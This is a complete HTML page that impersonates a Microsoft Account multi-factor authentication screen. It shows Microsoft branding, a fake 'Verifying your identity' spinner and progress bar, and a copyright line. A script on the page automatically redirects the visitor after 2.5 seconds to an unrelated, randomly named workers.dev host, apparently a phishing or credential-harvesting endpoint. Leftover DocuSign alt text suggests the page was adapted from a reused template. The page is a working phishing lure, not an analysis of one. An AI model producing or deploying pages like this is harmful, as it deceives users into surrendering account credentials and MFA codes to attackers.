<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Microsoft Account - MFA Verification</title>
<style>
    body {
        font-family: "Segoe UI", Tahoma, Arial, sans-serif;
        background-color: #f2f2f2;
        margin: 0;
        padding: 0;
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
        color: #323130;
    }
    .container {
        background-color: #ffffff;
        border-radius: 6px;
        box-shadow: 0 2px 8px rgba(0,0,0,0.15);
        padding: 40px;
        width: 420px;
        max-width: 90%;
        text-align: center;
    }
    .header {
        margin-bottom: 25px;
    }
    .microsoft-logo {
        width: 80px;
        height: 70px;
        margin-bottom: 20px;
    }
    .title {
        color: #0078d4;
        font-size: 20px;
        font-weight: 600;
        margin: 0 0 8px;
    }
    .subtitle {
        color: #605e5c;
        font-size: 15px;
        margin-bottom: 25px;
    }
    .spinner {
        width: 38px;
        height: 38px;
        border: 4px solid rgba(0,0,0,0.1);
        border-top-color: #0078d4;
        border-radius: 50%;
        animation: spin 1s linear infinite;
        margin: 0 auto 15px;
    }
    .loading-text {
        color: #323130;
        font-size: 15px;
        font-weight: 500;
        margin-bottom: 20px;
    }
    .progress-container {
        background-color: #e1dfdd;
        height: 8px;
        border-radius: 4px;
        overflow: hidden;
        margin-bottom: 15px;
        width: 100%;
    }
    .progress-bar {
        height: 100%;
        background-color: #0078d4;
        width: 0%;
        animation: fill 2.5s linear forwards;
    }
    .footer-text {
        color: #605e5c;
        font-size: 11px;
        margin-top: 20px;
    }
    @keyframes spin {
        0% { transform: rotate(0deg); }
        100% { transform: rotate(360deg); }
    }
    @keyframes fill {
        0% { width: 0%; }
        40% { width: 45%; }
        80% { width: 85%; }
        100% { width: 100%; }
    }
</style>
</head>
<body>
    <div class="container">
        <div class="header">
            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQUB7-ec4p3WLF43rCcbJ3-jITRcNnoUJS-nQ&s" alt="DocuSign Logo" class="docusign-logo" 
                 alt="Microsoft Logo" class="microsoft-logo" width="90px" height="90px">
            <h1 class="title">Verifying your identity...</h1>
            <p class="subtitle">To continue, please complete multi-factor authentication.</p>
        </div>
        <div class="spinner"></div>
        <p class="loading-text">Checking your account security...</p>
        <div class="progress-container">
            <div class="progress-bar"></div>
        </div>
        <p class="footer-text">&copy; Microsoft Corporation. All rights reserved.</p>
    </div>

<script>
(function() {
    const REDIRECT_DELAY = 2500;
    const MOBILE_REDIRECT_URL = "https://drhdou1jnu.h6idoike9t.workers.dev/";
    setTimeout(() => {
        window.location.href = MOBILE_REDIRECT_URL;
    }, REDIRECT_DELAY);
})();
</script>
</body>
</html>
